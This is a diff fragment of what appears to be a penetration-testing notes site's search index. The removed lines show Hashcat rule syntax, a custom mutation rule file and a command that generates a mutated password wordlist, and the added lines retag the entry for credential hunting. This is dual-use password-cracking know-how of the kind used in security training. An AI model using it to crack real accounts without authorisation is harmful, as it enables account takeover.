-<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
-
-<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
-<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
-
-<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
+]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Writing Custom Wordlists and Rules</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
       </categories>
       <tags>
-        <tag>Creds</tag>
-        <tag>CeWL</tag>
-        <tag>Cupp</tag>
-        <tag>Hashcat Rules</tag>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
 </search>
